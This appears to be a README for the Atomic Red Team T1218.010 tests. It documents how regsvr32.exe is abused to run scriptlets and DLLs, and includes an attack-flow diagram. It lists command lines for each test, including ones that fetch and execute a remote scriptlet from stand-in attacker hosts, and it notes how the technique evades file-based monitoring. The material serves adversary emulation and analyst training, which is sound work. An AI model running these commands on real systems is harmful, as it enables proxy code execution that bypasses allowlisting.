# T1218.010 — Regsvr32 (Signed Binary Proxy Execution)

This README documents the **attack techniques** demonstrated by the Atomic Red Team T1218.010 tests (Regsvr32). It focuses on the *attack flow* — how adversaries abuse `regsvr32.exe` to execute remote or local scriptlets/DLLs — and includes a clear diagram visualizing the attack (for operational / lab reporting). This file does **not** cover detections or defenses; those are documented separately in `report.md`.

---

## Summary (attack-only)

**Regsvr32** can be abused in multiple ways:

* **Remote COM scriptlet execution (Squiblydoo):** `regsvr32.exe /s /u /i:https://attacker.host/file.sct scrobj.dll` — the scriptlet is fetched from an external URL and executed in the context of regsvr32.
* **Local COM scriptlet execution:** `regsvr32.exe /s /u /i:C:\path\RegSvr32.sct scrobj.dll` — a local `.sct` (scriptlet) is executed.
* **Local DLL execution:** `regsvr32.exe /s path\to\malicious.dll` — calls `DllRegisterServer` in the DLL which can execute arbitrary code.
* **Registering non-DLL extensions:** adversaries may rename a DLL (e.g. `shell32.jpg`) and call `regsvr32.exe /s shell32.jpg` to execute.
* **Silent install variant:** calling `regsvr32.exe /s /i "path"` to invoke the DLL install routine.

These variants let adversaries execute code under the signed `regsvr32.exe` binary, often bypassing naive allowlisting or monitoring that trusts Microsoft-signed binaries.

---

## Atomic Tests (attack commands only)

* **Test 1 — Regsvr32 local COM scriptlet execution**

  ```cmd
  C:\Windows\system32\regsvr32.exe /s /u /i:"C:\Path\To\RegSvr32.sct" scrobj.dll
  ```

* **Test 2 — Regsvr32 remote COM scriptlet execution**

  ```cmd
  C:\Windows\system32\regsvr32.exe /s /u /i:https://attacker.example.com/RegSvr32.sct scrobj.dll
  ```

* **Test 3 — Regsvr32 local DLL execution**

  ```cmd
  IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s C:\Path\AllTheThingsx86.dll) ELSE (C:\Windows\system32\regsvr32.exe /s C:\Path\AllTheThingsx86.dll)
  ```

* **Test 4 — Regsvr32 register non-DLL (renamed dll)**

  ```cmd
  C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
  ```

* **Test 5 — Regsvr32 silent DLL install calling DllRegisterServer**

  ```cmd
  C:\Windows\system32\regsvr32.exe /s /i "C:\Path\AllTheThingsx86.dll"
  ```

---

## Attack Flow Diagram

The diagram below describes the *attacker-centric* flow used in the Atomic tests — it shows how an attacker hosts a scriptlet/DLL and how regsvr32 is used to retrieve and execute it on the victim. This is intended for inclusion in lab reports or to explain the attack pattern to analysts.

```mermaid
flowchart LR
  Attacker[Attacker Host]
  Attacker -- Host scriptlet/DLL --> HTTP[HTTP(S) Server hosting .sct / .dll]

  Victim[Compromised Host]
  VictimRegsvr[regsvr32.exe]
  VictimRegsvr -->|Invoke with /i:url or /i:path| Scriptlet[COM Scriptlet (.sct) or DLL]
  Scriptlet -->|Executes| Payload[Arbitrary Code (calc.exe, backdoor, lateral tooling)]

  Attacker -.->|Triggers social engineering / malicious doc| VictimUser[User on Victim]
  VictimUser -->|Opens maldoc or runs command| VictimRegsvr

  subgraph Network
    HTTP
  end

  style Attacker fill:#ffe6e6,stroke:#900
  style Victim fill:#fffbe6,stroke:#aa8800
  style VictimRegsvr fill:#fff8f0,stroke:#aa5500
  style Scriptlet fill:#fff0f0,stroke:#aa0000
  style Payload fill:#ffefdf,stroke:#cc5500
```

---

## Notes (attack-centric)

* The remote scriptlet (`/i:https://...`) avoids writing files to disk on the victim and will still load and execute the script in process memory — this makes detection harder with naive file-only monitoring.
* Using `regsvr32.exe` leverages a signed Microsoft binary; organizations should assume `regsvr32` can be abused for execution and add behavior-based monitoring for suspicious regsvr32 command lines.
* The `scrobj.dll` argument is a normal regsvr32 parameter and should not be taken alone as benign; the presence of `/i:` with a URL or unfamiliar local scriptlet is the key indicator.

---
